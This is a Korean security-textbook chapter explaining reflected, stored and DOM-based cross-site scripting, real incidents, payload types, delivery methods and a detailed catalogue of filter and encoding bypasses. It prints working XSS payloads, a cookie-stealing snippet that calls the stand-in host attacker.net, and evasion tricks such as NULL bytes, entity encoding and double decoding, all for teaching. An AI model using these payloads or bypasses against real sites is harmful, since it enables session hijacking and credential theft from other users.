# 32장. 크로스 사이트 스크립팅

> **이 장에서 다루는 것**
>
> - 반사형·저장형·DOM 기반 XSS가 서로 다른 신뢰 경계를 어떻게 깨는가
> - XSS 페이로드가 세션 하이재킹을 넘어 무엇까지 할 수 있는가
> - 필터를 우회하는 수십 가지 기법과, 각 기법이 어떤 가정을 무너뜨리는가
> - "입력을 이스케이프한다"는 발상이 왜 처음부터 잘못되었는가
> - 출력 컨텍스트와 도메인 타입 — 컨텍스트를 기억하는 두 가지 방법

Part VI까지 우리는 공격자가 애플리케이션 자체를 노리는 경우를 다뤘다. SQL 인젝션, 명령 인젝션, 경로 순회 — 표적은 언제나 서버였다. 이 부에서 표적이 바뀐다. **공격자의 일차 표적은 애플리케이션의 다른 사용자다.** 취약점은 여전히 애플리케이션 안에 있지만, 그것이 상처 입히는 대상은 서버가 아니라 그 서버를 신뢰하고 접속한 사람이다.

크로스 사이트 스크립팅(cross-site scripting, XSS)은 이 범주의 대부(代父)다. 실제로 운영 중인 웹 애플리케이션에서 가장 흔하게 발견되는 취약점이며, 온라인 뱅킹처럼 가장 보안이 중요한 애플리케이션조차 예외가 아니다. 한때 침투 테스터들은 XSS를 "시시한(lame)" 결함으로 여겼다. 너무 흔했고, 혼자서 애플리케이션을 노리는 해커에게는 서버 측 명령 인젝션만큼 직접적인 쓸모가 없어 보였기 때문이다. 이 인식은 뒤집혔다. 오늘날 XSS는 웹의 첫 번째 보안 위협으로 꼽히며, XSS만으로 조직 전체가 완전히 장악된 실제 사례가 여럿 있다.

XSS의 뿌리는 이 책이 반복해 온 한 문장으로 요약된다. **인젝션이란 데이터와 구분자가 같은 채널을 공유할 때 일어난다**(→ 27.1). SQL 인젝션에서 그 채널은 SQL 질의 문자열이었다. XSS에서 그 채널은 HTML 응답 본문이다. 사용자가 제공한 문자열이 HTML의 원본 소스 코드 안으로 복사될 때, 그 문자열은 페이지의 내용만 바꾸는 것이 아니라 **페이지의 구조**를 바꿀 수 있다 — 따옴표를 닫고, 태그를 열고, 스크립트를 주입하면서. HTTP는 "사용자는 임의의 입력을 보낼 수 있다"는 전제 위에 서 있고(→ 6.7), 브라우저는 서버가 보낸 것을 실행 가능한 코드로 신뢰한다(→ 5.9). XSS는 이 두 사실이 만나는 지점에 있다.

이 장은 XSS를 세 종류로 나누어 각각의 탐지·익스플로잇 방법을 살펴본 뒤, 이 장의 무게중심인 **필터·인코딩 우회 기법의 총정리**(32.5)로 들어간다. 그다음 방어를 다루되, 방어의 결론을 32.10에서 다시 쓴다. 거기서 우리는 "무엇을 이스케이프할 것인가"라는 질문 자체가 틀렸음을 보이고, **출력 컨텍스트**와 **도메인 타입**이라는 두 개념으로 문제를 재정의한다.

## 32.1 XSS의 종류 — 반사형, 저장형, DOM 기반

XSS 취약점은 세 가지 형태로 나뉜다. 셋은 공통점을 가지지만, 어떻게 발견되고 어떻게 익스플로잇되는지에서 중요한 차이가 있다. 차이의 핵심은 **공격자의 스크립트가 어느 경로로 피해자의 브라우저에 도달하는가**이다.

### 32.1.1 반사형 XSS — 하나의 요청과 응답

가장 흔한 형태다. 애플리케이션이 요청에 담긴 값을 받아, 그것을 즉시 응답의 HTML 안에 그대로 삽입해 돌려보낼 때 발생한다. 전형적인 예는 오류 메시지를 동적으로 생성하는 페이지다. 온라인 서점에서 다음과 같은 URL을 생각해 보자.

```
https://books.example.com/error?message=주문한+책을+찾을+수+없습니다
```

서버는 `message` 파라미터의 값을 오류 페이지 템플릿의 적절한 위치에 복사한다.

```html
<p>주문한 책을 찾을 수 없습니다</p>
```

아무 필터링도 없다면, 공격자는 메시지를 스크립트로 바꾼다.

```
https://books.example.com/error?message=<script>alert(1)</script>
```

요청에 대한 응답은 다음을 포함하고, 브라우저에서 렌더링될 때 스크립트가 실행된다.

```html
<p><script>alert(1)</script></p>
```

이 단순한 확인이 두 가지를 증명한다. 첫째, `message`의 내용이 임의의 데이터로 대체되어 브라우저로 돌아온다. 둘째, 서버가 이 데이터에 무슨 처리를 하든(한다면) 그 처리는 스크립트 실행을 막기에 불충분하다. 이런 단순한 형태가 실제 애플리케이션에 존재하는 XSS의 약 75%를 차지한다.

**반사형(reflected)** 이라 불리는 것은, 익스플로잇이 요청을 만들어 그 안에 심은 자바스크립트가 요청을 보낸 사용자에게 **되돌려 반사(reflect)** 되기 때문이다. 페이로드는 단 한 번의 요청과 응답으로 전달되고 실행된다. 그래서 **1차(first-order) XSS**라고도 부른다.

여기서 자연스러운 의문이 생긴다. 공격자가 사용자를 자신이 고른 URL로 유인할 수 있다면, 왜 굳이 취약한 애플리케이션의 XSS 버그를 거치는가? 왜 자기 서버에 악성 스크립트를 두고 직접 링크를 주지 않는가? 답은 **동일 출처 정책(same-origin policy)** 에 있다(→ 5.10). 공격자의 목표는 그저 스크립트를 실행하는 것이 아니라 사용자의 세션 토큰을 훔치는 것이다. 브라우저는 아무 스크립트에나 특정 도메인의 쿠키 접근을 허용하지 않는다. 쿠키는 그것을 발급한 도메인이 돌려보낸 페이지 안에서만 접근할 수 있다. `attacker.net`에 있는 스크립트가 `document.cookie`를 조회해도 `books.example.com`의 쿠키는 얻지 못한다. 그러나 XSS를 통하면 이야기가 다르다. 브라우저 입장에서 공격자의 스크립트는 **`books.example.com`이 보낸 것**이므로, 그 스크립트는 서점과 사용자의 관계라는 보안 컨텍스트 안에서 실행되고, 서점이 발급한 쿠키에 접근한다. 이 취약점의 이름이 "크로스 사이트"인 이유가 바로 여기 있다.

### 32.1.2 저장형 XSS — 두 번의 요청, 그리고 기다림

한 사용자가 제출한 데이터가 애플리케이션에(보통 백엔드 데이터베이스에) **저장**되었다가, 나중에 다른 사용자에게 적절한 필터링 없이 표시될 때 발생한다. 사용자 간 상호작용을 지원하거나, 관리자가 같은 애플리케이션 안에서 사용자 데이터를 열람하는 애플리케이션에서 흔하다.

온라인 서점의 도서 리뷰 기능을 생각해 보자. 어떤 사용자가 책에 리뷰를 남기고, 그 리뷰는 그 책을 보는 모든 사람에게 표시된다. 리뷰 본문에 자바스크립트를 심을 수 있고 애플리케이션이 이를 걸러내지 않는다면, 공격자는 조작된 리뷰를 게시해 그 리뷰를 보는 누구의 브라우저에서든 임의의 스크립트를 실행시킬 수 있다.

저장형 XSS는 보통 최소 두 번의 요청을 거친다. 첫 번째로 공격자가 악성 코드를 담은 데이터를 게시하면 애플리케이션이 그것을 저장한다. 두 번째로 피해자가 그 데이터를 담은 페이지를 열람할 때 코드가 실행된다. 그래서 **2차(second-order) XSS**라고도 한다. (엄밀히 말하면 이 공격에는 "크로스 사이트" 요소가 없으므로 이름이 부정확하지만, 널리 쓰이므로 그대로 둔다.)

반사형과 저장형은 공격 과정에서 두 가지 중요한 차이가 있고, 이 차이 때문에 **저장형이 대체로 더 위험하다.**

- **유인이 필요 없다.** 반사형은 공격자가 피해자를 조작된 URL로 끌어들여야 한다. 저장형은 애플리케이션 안에 공격을 배치해 두고 피해자가 스스로 그 페이지를 열기를 기다리기만 하면 된다. 그 페이지는 대개 정상 사용자가 자기 의지로 접근하는 일반 페이지다.
- **피해자가 이미 로그인해 있다.** 공격자의 목표는 피해자가 애플리케이션을 사용 중일 때 훨씬 쉽게 달성된다. 저장형에서는 피해자가 페이로드를 실행하는 순간 정의상 애플리케이션을 사용 중이다. 그 페이지가 인증 영역 안이라면 피해자는 반드시 로그인 상태다.

이 차이 때문에 저장형 XSS는 종종 애플리케이션 보안에 치명적이다. 공격자가 조작된 데이터를 제출하고 기다리다가, 피해자 중 하나가 **관리자**라면, 애플리케이션 전체가 장악된다.

### 32.1.3 DOM 기반 XSS — 서버를 거치지 않는 경로

세 번째 범주는 앞의 둘과 근본적으로 다르다. 반사형과 저장형은 모두 "애플리케이션이 사용자 데이터를 받아 안전하지 않게 응답에 표시한다"는 공통 패턴을 가진다. DOM 기반 XSS는 이 패턴을 공유하지 않는다. 사건의 흐름은 이렇다.

1. 사용자가 공격자가 제공한, 자바스크립트를 담은 조작된 URL을 요청한다.
2. **서버의 응답에는 공격자의 스크립트가 어떤 형태로도 들어 있지 않다.**
3. 그런데도 브라우저가 그 응답을 처리할 때 스크립트가 실행된다.

어떻게 이런 일이 가능한가? 클라이언트 측 자바스크립트가 브라우저의 **문서 객체 모델(Document Object Model, DOM)** 에 접근할 수 있고, 따라서 현재 페이지를 로드한 URL을 읽을 수 있기 때문이다. 애플리케이션이 발급한 스크립트가 URL에서 데이터를 추출해 처리한 뒤, 그것으로 페이지 내용을 동적으로 갱신할 때 DOM 기반 XSS가 발생할 수 있다.

앞서 본 반사형 오류 페이지를, 서버 측이 아니라 클라이언트 측에서 구현했다고 하자. 서버는 매번 똑같은 정적 HTML을 돌려주고, 메시지 생성은 다음 스크립트가 맡는다.

```html
<script>
  var url = document.location;
  url = unescape(url);
  var message = url.substring(url.indexOf('message=') + 8, url.length);
  document.write(message);
</script>
```

이 스크립트는 URL에서 `message` 파라미터 값을 추출해 페이지의 HTML 소스에 그대로 써넣는다(`document.write`). 개발자의 의도대로 쓰면 오류 메시지가 편하게 만들어진다. 그러나 공격자가 `message` 값에 스크립트를 넣으면, 그 코드는 페이지에 동적으로 쓰이고 서버가 돌려준 것과 똑같이 실행된다. 결정적으로, 페이로드를 URL의 **프래그먼트**(`#` 뒤)에 두면 브라우저는 그 부분을 서버로 전송하지 않는다(→ 7.2). 따라서 어떤 서버 측 필터도 그것을 볼 수 없다.

DOM 기반 XSS는 익스플로잇의 형태로는 반사형과 더 닮았다. 공격자가 조작된 URL로 사용자를 유인하고, 그 특정 요청에 대한 응답이 악성 코드를 실행시킨다. 그러나 코드가 실행되는 메커니즘은 완전히 다르며, 이 차이가 탐지와 방어 모두를 바꾼다(→ 32.7, 32.9).

> **이 절이 뒷받침하는 것**
>
> - 반사형 XSS가 성립하는 이유(브라우저가 공격자 스크립트를 서점이 보낸 것으로 취급) → **5.10** (동일 출처 판정은 어느 시점에 어떤 값으로 이뤄지는가)
> - DOM 기반 XSS가 서버 필터를 우회하는 근거(프래그먼트는 전송되지 않음) → **7.2** (URL 문법 — 프래그먼트)

## 32.2 실제 세계의 XSS 공격

XSS의 심각성은 실제 사례에서 가장 분명하게 드러난다. 이들은 "시시한 버그"라는 통념이 왜 틀렸는지를 보여 준다.

**Apache 재단 (2010).** 이슈 추적 애플리케이션의 반사형 XSS를 통해 침해되었다. 공격자는 리다이렉터 서비스로 감춘 링크를 게시했고, 그 URL은 로그인한 사용자의 세션 토큰을 탈취하도록 만들어져 있었다. 관리자가 링크를 클릭하자 세션이 탈취되어 공격자가 관리 권한을 얻었다. 공격자는 프로젝트의 업로드 폴더를 웹 루트 안의 실행 가능한 디렉터리로 바꾼 뒤, 트로이 목마 로그인 폼을 업로드해 권한 있는 사용자들의 자격증명을 수집했다. 그 자격증명 일부가 인프라의 다른 시스템에서 재사용되고 있었고, 공격은 취약한 웹 애플리케이션을 넘어 확산되었다. **하나의 반사형 XSS가 인프라 전체 침해의 출발점이 된 것이다.**

**MySpace의 Samy 웜 (2005).** MySpace는 사용자가 프로필 페이지에 자바스크립트를 넣지 못하도록 필터를 두었다. Samy라는 사용자가 이 필터를 우회해 자기 프로필에 스크립트를 심었다. 이 스크립트는 프로필을 열람하는 사용자의 브라우저에서 두 가지를 했다. 첫째, Samy를 그 사용자의 "친구"로 추가했다. 둘째, 스크립트 자신을 그 사용자의 프로필에 복사했다. 그 결과 감염된 프로필을 보는 사람이 다시 감염되는 **자기 전파 웜**이 되었다. 몇 시간 만에 원 작성자는 거의 100만 건의 친구 요청을 받았고, MySpace는 애플리케이션을 내리고 모든 프로필에서 스크립트를 제거하고 필터를 고쳐야 했다. 이것이 32.3에서 다룰 XSS 웜의 원형이다.

**웹메일 애플리케이션.** 웹메일은 구조적으로 저장형 XSS에 노출되어 있다. 수신자가 메일을 열람할 때 HTML 형식의 본문을 브라우저 안에서 렌더링하므로, 제3자의 HTML을 애플리케이션이 표시하는 페이지에 그대로 복사하는 셈이다. 2009년 StrongWebmail은 CEO의 메일을 뚫는 자에게 상금을 걸었고, 해커들은 웹메일의 저장형 XSS를 이용해 악성 메일 열람 시 임의의 자바스크립트가 실행되게 만들어 CEO의 세션을 침해하고 상금을 받았다.

**Twitter (2009).** 두 개의 XSS 웜이 저장형 XSS를 이용해 사용자 사이로 퍼지며 웜 작성자의 사이트를 홍보하는 글을 게시했다. Ajax 코드를 클라이언트에서 광범위하게 쓰는 특성 때문에 여러 DOM 기반 XSS도 발견되었다.

이 사례들이 공통으로 말하는 것이 있다. **XSS는 종종 다른 취약점과 결합되어 파괴력을 얻는다.** 그 자체로는 저위험으로 분류될 버그도, 적절한 상황에서는 치명적 공격의 길을 연다. 예를 들어 저자들은 사용자의 표시 이름(display name)에 있는 저장형 XSS를 만난 적이 있다. 이 이름은 로그인 후 개인화된 환영 메시지에만 쓰였고 다른 사용자에게는 표시되지 않았으므로, 그 자체로는 매우 낮은 위험이었다. 그러나 접근 제어 결함 때문에 **누구나 다른 사용자의 표시 이름을 편집할 수 있었다.** 이 결함도 단독으로는 의미가 없었다. 두 저위험 결함을 엮자, 공격자는 모든 사용자의 표시 이름에 스크립트를 주입해 로그인할 때마다 세션 토큰을 자기 서버로 전송하게 만들 수 있었다. 관리자가 로그인하기를 기다렸다가 그 세션을 탈취하면 애플리케이션 전체가 넘어간다. 심층 방어(defense in depth)가 아무리 사소해 보이는 취약점이라도 모두 제거하라고 요구하는 이유가 여기 있다.

## 32.3 XSS 페이로드 — 세션 하이재킹, 권한 있는 행위, 트로이 목마, 웜

지금까지 우리는 고전적 페이로드, 즉 세션 토큰 탈취에 집중했다. 그러나 어떤 종류의 XSS든 훨씬 다양한 페이로드를 전달할 수 있다.

**세션 하이재킹.** 가장 널리 알려진 페이로드다. 인증된 사용자의 세션 토큰을 탈취해, 그 사용자로서 애플리케이션에 접근한다. 전형적인 코드는 다음과 같다.

```javascript
var i = new Image();
i.src = "https://attacker.net/" + document.cookie;
```

이 코드는 피해자의 브라우저가 공격자 도메인으로 요청을 보내게 하고, 그 요청에는 서점에 대한 현재 세션 토큰이 실린다. 공격자는 자기 서버로 오는 요청을 감시하다가 토큰을 받아 세션을 탈취한다. 여기서 23.5절이 예고한 것이 실현된다. **세션 토큰이 클라이언트에 존재한다는 사실 자체가 하이재킹의 노출면이다.** 그리고 이 페이로드는 20.6절이 다룬 `HttpOnly` 속성의 정확한 한계를 드러낸다. `HttpOnly`가 설정된 쿠키는 `document.cookie`로 읽을 수 없으므로 이 특정 코드는 실패한다. 그러나 `HttpOnly`는 XSS 자체를 막지 못한다 — 스크립트는 여전히 실행되고, 사용자로서 요청을 보내고, 화면을 조작할 수 있다(→ 20.6). "로그인 상태 유지"용 지속 쿠키를 쓰는 애플리케이션에서는 위 과정의 1단계(로그인)조차 불필요하다. 피해자가 능동적으로 로그인해 있지 않아도 공격이 성립한다.

**권한 있는 행위 수행 (사용자 유도).** 세션을 탈취해 공격자가 직접 행동하는 대신, **페이로드 스크립트 자체가 피해자의 브라우저 안에서 행동을 수행**하게 할 수 있다. 이 방식은 공격자가 관리 권한이 필요한 행위 — 예를 들어 자신이 통제하는 계정의 권한 상승 — 를 원할 때 특히 유용하다. 방대한 사용자 기반에서 관리자를 일일이 찾아 세션을 탈취하는 것은 번거롭다. 대신 감염된 모든 사용자가 공격자 계정의 권한을 올리려 시도하게 만든다. 대부분은 실패하지만, 관리자가 감염되는 순간 권한 상승이 성공한다. 이 방식은 세션 탈취보다 은밀하다. 공격자는 자기 서버를 감시할 필요가 없고, 애플리케이션 로그에는 "다른 사용자가 그 행위를 했다"는 흔적만 남는다. 사용자를 유도해 행위를 수행시키는 구체적 기법은 요청 위조를 다루는 **33장**에서 이어진다.

**트로이 목마 주입.** 가상 훼손(virtual defacement)을 넘어, 취약한 애플리케이션에 실제로 동작하는 기능을 주입한다. 의도는 사용자를 속여 바람직하지 않은 행위 — 예를 들어 민감한 데이터 입력 — 를 하게 만드는 것이다. 대표적으로 **트로이 목마 로그인 폼**을 제시해 자격증명을 공격자 서버로 보내게 한다. 솜씨 있게 실행하면 사용자를 실제 애플리케이션에 매끄럽게 로그인시켜 이상을 눈치채지 못하게 한다. 신용카드 정보를 요구하는 변형도 있다. 이 공격이 순수 피싱보다 훨씬 설득력 있는 이유는, URL이 **실제 애플리케이션의 진짜 도메인**을 가리키고 유효한 TLS 인증서까지 갖추기 때문이다. 사용자는 정품 사이트 안에서 로그인 폼을 마주한다. 여기에 자동 완성(autocomplete)이 켜진 폼이 있으면, 스크립트가 폼을 인스턴스화하고 브라우저가 자동 완성하기를 기다렸다가 필드 값을 조회해 저장된 데이터를 탈취할 수 있다 — 사용자의 어떤 상호작용도 없이.

**XSS 웜.** MySpace Samy 사례가 보여 준, 사용자 유도 페이로드의 극한 형태다. 페이로드가 감염된 사용자로 하여금 페이로드 자신을 다시 퍼뜨리는 행위를 하게 만들면, 지수적으로 확산되는 자기 전파 스크립트가 된다. 웜은 대량 사용자 기반에 대해 최소한의 노력으로 무단 행위를 수행하는 능력을 극적으로 보여 준다.

이 외에도 XSS는 클라이언트 측 공격을 확장하는 발판이 된다 — 키 입력 로깅, 브라우징 히스토리 탈취, 로컬 네트워크 포트 스캐닝 등. 이들은 **36장**에서 다룬다.

> **이 절이 뒷받침하는 것**
>
> - 세션 토큰이 클라이언트에 노출된다는 사실 → **23.5** (클라이언트의 토큰 하이재킹 노출)이 예고한 위협의 실현
> - `HttpOnly`가 쿠키 탈취는 막아도 XSS는 막지 못함 → **20.6** (HttpOnly가 막는 것과 못 막는 것)
> - 페이로드에 의한 사용자 행위 유도 → **33장** (요청 위조)

## 32.4 XSS 전달 메커니즘

XSS 취약점을 찾고 페이로드를 만들었다면, 공격자는 그것을 다른 사용자에게 **전달**할 방법이 필요하다. 전달 메커니즘은 XSS 종류에 따라 다르다.

**반사형·DOM 기반 XSS의 전달.** 조작된 URL을 무작위 사용자에게 대량 이메일로 보내는 명백한 피싱 벡터 외에도 여러 경로가 있다.

- **표적 공격(스피어 피싱).** 특정 사용자 한 명 또는 소수를 겨냥해 위조된 이메일을 보낸다. 예를 들어 관리자에게 "이 URL에서 오류가 난다"며 아는 사용자를 사칭한 메일을 보낸다. 특정 사용자의 세션을 노릴 때 잘 조사된 표적 공격이 가장 효과적이다.
- **제3자 웹사이트.** XSS를 GET 메서드로 트리거할 수 있다면, 공격자는 취약한 URL을 가리키는 `<img>` 태그를 다른 사이트에 게시할 수 있다. 그 콘텐츠를 보는 사용자는 자기도 모르게 악성 URL을 요청한다. 또는 공격자가 흥미로운 콘텐츠로 방문을 유도하는 자기 사이트를 만들고, 그 페이지가 취약한 애플리케이션으로 XSS 페이로드가 담긴 요청을 보내게 한다. 이 방식은 **POST로만 트리거되는** 취약점에도 통한다. 악성 사이트에 POST 메서드를 쓰고 취약한 애플리케이션을 target으로 하는 HTML 폼을 두고, 자바스크립트로 자동 제출하면 된다.
- **배너 광고.** 공격자가 XSS 페이로드가 담긴 URL로 연결되는 배너 광고를 산다. 광고가 표적 애플리케이션 자체의 페이지에 배정되는 경우도 있는데, 이때 광고는 "온사이트(on-site)"가 되어 브라우저의 XSS 방어를 우회하며, 광고를 클릭한 사람이 공격 순간 그 애플리케이션을 사용 중임을 보장한다.
- **"친구에게 알리기" 기능.** 임의의 내용과 수신자로 이메일을 생성하는 기능을 악용해, **조직 자신의 서버에서 발송되는** 메일로 XSS 공격을 전달한다.

전달 벡터 중 일부는 다른 장의 주제와 직접 이어진다. 리다이렉터를 경유해 Referer 조건을 만족시키는 기법은 **35.3**(오픈 리다이렉션)이 다루는 결함에 의존하고, 사용자를 유도해 요청을 발생시키는 구조 전반은 **33장**의 요청 위조와 한 몸이다.

**저장형 XSS의 전달.** 두 가지로 나뉜다. **인밴드(in-band)** 전달은 데이터가 애플리케이션의 주 웹 인터페이스를 통해 공급되는 대부분의 경우다. 개인정보 필드(이름·주소·이메일), 업로드한 문서·파일의 이름, 관리자에게 보내는 피드백, 다른 사용자에게 보이는 메시지·댓글·리뷰, 그리고 **애플리케이션 로그에 기록되어 관리자에게 브라우저로 표시되는 모든 것**(URL, 사용자명, Referer, User-Agent 등)이 흔한 위치다. **아웃오브밴드(out-of-band)** 전달은 데이터가 다른 채널로 공급되는 경우다. 웹메일 공격이 대표적으로, SMTP 서버로 악성 데이터를 보내면 그것이 결국 HTML 형식 메일로 사용자에게 표시된다. 로그에 남는 값이 관리자 화면에서 실행된다는 점은 16.6절이 다룬 로그 인젝션과 같은 뿌리를 공유한다.

## 32.5 반사형 XSS 찾기와 익스플로잇 — 필터·인코딩 우회 기법 총정리

이 절이 이 장의 무게중심이다. XSS를 막으려는 필터는 무수히 많고, 그것을 우회하는 기법은 그보다 더 많다. 각 기법을 나열하는 데 그치지 않고 **그 기법이 어떤 가정을 깨는지**를 함께 밝힌다. 우회의 본질은 언제나 하나다. 필터는 세계에 대한 어떤 가정을 하고 있고, 공격자는 브라우저가 그 가정 밖에서도 코드를 실행한다는 사실을 이용한다.

### 32.5.1 반사 지점 찾기와 컨텍스트 파악

반사형 XSS를 신뢰성 있게 탐지하는 절차는 다음과 같다.

1. **양성(benign) 문자열을 각 진입점에 제출한다.** 애플리케이션 어디에도 없고 알파벳 문자만으로 이루어져 XSS 필터의 영향을 받지 않을 고유 문자열(예: `myxsstestdmqlwp`)을 고른다. 이를 모든 페이지의 모든 파라미터에 한 번에 하나씩 제출한다.
2. **응답에서 이 문자열이 반사되는 모든 위치를 식별한다.** GET과 POST를 모두 시험하고, URL 쿼리 문자열과 메시지 본문의 모든 파라미터를 포함한다. 표준 파라미터 외에 **HTTP 요청 헤더**도 시험해야 한다. Referer와 User-Agent가 오류 메시지에 복사되는 XSS는 흔하다. 이들은 Flash 객체 등으로 임의 헤더를 넣은 요청을 피해자가 보내게 유도할 수 있으므로 유효한 벡터다.
3. **각 반사에 대해 구문적 컨텍스트(syntactic context)를 파악한다.** 이것이 핵심이다. 데이터가 응답의 어느 문법 위치에 삽입되는가에 따라 필요한 익스플로잇이 완전히 달라진다.

컨텍스트별로 대표적인 익스플로잇을 보자.

**컨텍스트 1 — 태그 속성 값.** 응답이 다음과 같다면:

```html
<input type="text" name="address" value="myxsstestdmqlwp">
```

큰따옴표를 닫고 `<input>` 태그를 끝낸 뒤 스크립트를 도입한다:

```
"><script>alert(1)</script>
```

또는 태그 안에 머물면서 이벤트 핸들러를 주입한다(일부 필터를 우회):

```
" onfocus="alert(1)
```

**컨텍스트 2 — 자바스크립트 문자열.** 응답이 다음과 같다면:

```html
<script>var a = 'myxsstestdmqlwp'; var b = 123; ... </script>
```

작은따옴표를 닫고 문장을 종료한 뒤 원하는 코드로 진행한다. 인터프리터 오류를 막기 위해 뒤따르는 코드가 유효한 문법으로 이어지게 하거나, `//`로 나머지를 주석 처리한다:

```
alert(1); var foo='
```

**컨텍스트 3 — URL을 담는 속성.** 응답이 다음과 같다면:

```html
<a href="myxsstestdmqlwp">여기를 클릭 ...</a>
```

`javascript:` 프로토콜로 URL 속성 안에 직접 스크립트를 넣는다:

```
javascript:alert(1);
```

컨텍스트를 잘못 읽으면 어떤 익스플로잇도 실행되지 않는다. 그래서 컨텍스트 파악이 우회 기법 전체의 전제다.

### 32.5.2 스크립트를 도입하는 네 가지 통로

시그니처 기반 필터는 흔히 `<script>` 같은 표현을 찾아 차단한다. 그러나 HTML 페이지에 스크립트를 도입하는 방법은 `<script>` 태그만이 아니다. **`<script>`도, `" < > /` 같은 흔히 걸러지는 문자도 쓰지 않고** 동작하는 익스플로잇을 만들 수 있다. 스크립트를 도입하는 통로는 크게 네 가지다.

**(1) 스크립트 태그.** `<script>`를 직접 쓰는 것을 넘어, 태그 사용을 우회적 문법으로 감싼다:

```html
<object data="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">클릭</a>
```

(base64 문자열은 `<script>alert(1)</script>`이다.) 이는 `data:` 스킴이 문서 자체를 실어 나른다는 사실(→ 7.5)을 이용해, `<script>`라는 리터럴이 요청에 나타나지 않게 한다.

**(2) 이벤트 핸들러.** 수많은 태그의 이벤트 핸들러로 스크립트를 실행할 수 있다. 사용자 상호작용 없이 발화하는 것들이 특히 위험하다:

```html
<xml onreadystatechange=alert(1)>
<object onerror=alert(1)>
<img type=image src=valid.gif onreadystatechange=alert(1)>
<body onbeforeactivate=alert(1)>
```

HTML5는 새로운 벡터를 대량으로 추가했다. `autofocus` 속성은 예전에 상호작용을 요구하던 이벤트를 자동 발화시킨다:

```html
<input autofocus onfocus=alert(1)>
<body onscroll=alert(1)><br><br>...<br><input autofocus>
```

닫는 태그의 이벤트 핸들러도 허용하며, 새 태그도 도입했다:

```html
</a onmousemove=alert(1)>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
```

이 통로가 깨는 가정은 "스크립트는 `<script>` 안에만 있다"이다.

**(3) 스크립트 의사 프로토콜(pseudo-protocol).** URL을 기대하는 속성 안에서 인라인 스크립트를 실행한다:

```html
<object data=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
```

`javascript:`가 대표적이지만 IE에서는 `vbs:`도 쓸 수 있다. HTML5는 여기에도 새 벡터를 더했다:

```html
<form id=test /><button form=test formaction=javascript:alert(1)>
<event-source src=javascript:alert(1)>
```

`event-source` 태그는 이름에 하이픈을 포함하므로, "태그 이름은 문자로만 이루어진다"고 가정하는 정규식 기반 필터를 우회한다.

**(4) 동적으로 평가되는 스타일.** 일부 브라우저는 CSS 안의 자바스크립트를 지원했다:

```html
<x style=x:expression(alert(1))>
<x style=behavior:url(#default#time2) onbegin=alert(1)>
```

이 통로가 깨는 가정은 "스크립트 실행은 HTML/JS 문맥에서만 일어난다"이다. 스타일도 실행 문맥이 될 수 있다.

### 32.5.3 HTML 문법을 난독화해 시그니처를 우회하기

다른 통로로 바꿔도 막힌다면, 문법 자체를 난독화한다. 시그니처 기반 필터는 정규식으로 태그 괄호, 태그 이름, 속성 이름, 속성 값 같은 핵심 HTML 구성 요소를 식별한다. 브라우저가 관용하는 비정상 문자를 핵심 지점에 끼워 넣어 이 식별을 깬다. 기준 익스플로잇 `<img onerror=alert(1) src=a>`를 여러 방식으로 변형해 보자.

**표 32-1. HTML 난독화 우회 기법**

| 대상 지점 | 우회 예시 | 깨는 가정 |
|---|---|---|
| 태그 이름 대소문자 | `<iMg onerror=alert(1) src=a>` | 태그 이름은 소문자로만 매칭된다 |
| 태그 이름에 NULL 바이트 | `<i[%00]mg onerror=alert(1) src=a>` | NULL은 문자열을 끝낸다(IE는 아님) |
| 임의의 태그 이름 | `<x onclick=alert(1) src=a>클릭</x>` | 위험한 태그 이름은 목록으로 다 막을 수 있다 |
| base 태그 하이재킹 | `<base href="http://attacker.net/js/">` | 이후 상대 URL 스크립트 include의 출처는 고정이다 |
| 태그 이름 뒤 공백 대체 | `<img/onerror=alert(1) src=a>` `<img[%09]onerror=...>` | 속성 앞은 반드시 공백이다 |
| 속성 이름에 NULL | `<img o[%00]nerror=alert(1) src=a>` | `on`으로 시작하는 이름만 막으면 된다 |
| 속성 구분자(백틱) | `<img onerror=`alert(1)`src=a>` | 속성값은 따옴표 또는 공백으로만 구분된다 |
| 속성 순서 뒤집기 | `<img src='a'onerror=alert(1)>` | 이벤트 핸들러는 첫 속성으로 온다 |
| 속성 값 HTML 인코딩 | `<img onerror=a&#x6c;ert(1) src=a>` | 필터가 보는 것과 브라우저가 보는 것이 같다 |

NULL 바이트 기법은 특히 강력하다. IE는 HTML 페이지 어디에서든 NULL 바이트를 무시하고 넘어가므로, IE의 이 동작을 모르는 시그니처 필터를 빠르게 우회한다. 게다가 WAF는 성능을 위해 네이티브 코드로 작성되는 일이 많은데, 그 경우 NULL 바이트가 문자열을 종료시켜 **WAF가 NULL 뒤의 페이로드를 아예 보지 못하게** 만든다(→ 12.11).

**속성 값의 HTML 인코딩**은 별도로 강조할 값이 있다. 브라우저는 속성 값을 처리하기 전에 HTML 디코딩하므로, 스크립트 코드를 HTML 엔티티로 감춰 필터를 피할 수 있다:

```html
<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29;>
```

브라우저는 명세에서 벗어난 표기도 관용한다. 10진과 16진을 모두 쓸 수 있고, 앞에 0을 여러 개 붙여도 되고, 끝의 세미콜론을 생략해도 된다. 다음은 모두 최소 한 브라우저에서 동작한다:

```html
<img onerror=a&#x006c;ert(1) src=a>
<img onerror=a&#108;ert(1) src=a>
<img onerror=a&#0108ert(1) src=a>
```

이 관용은 인코딩 스킴의 다양성(→ 7.6)이 그대로 공격 표면이 됨을 보여 준다.

**태그 괄호 자체를 우회하기.** 어떤 애플리케이션은 입력 필터를 적용한 **뒤에** 불필요한 URL 디코드를 한 번 더 수행한다. 그러면 다음 입력:

```
%253cimg%20onerror=alert(1)%20src=a%253e
```

은 애플리케이션 서버가 한 번 디코드해 `%3cimg ... src=a%3e`가 되어(태그 괄호 없음) 필터를 통과하고, 애플리케이션이 두 번째 디코드를 하면 `<img onerror=alert(1) src=a>`가 되어 실행된다. 이것이 7.7절이 다룬 **이중 디코딩과 정규화 순서 문제**가 XSS에서 발현된 형태다. 필터링과 인코딩은 반드시 모든 정규화가 **끝난 뒤** 수행되어야 하며, 그 뒤에 다시 정규화해서는 안 된다.

비슷하게, 애플리케이션 프레임워크가 유니코드 문자를 가장 가까운 ASCII로 "번역"하는 경우, 유니코드 이중 꺾쇠(`«` `»`)를 태그 괄호 대신 넣으면 필터는 통과하고 삽입 시점에 번역되어 태그가 된다:

```
«img onerror=alert(1) src=a»
```

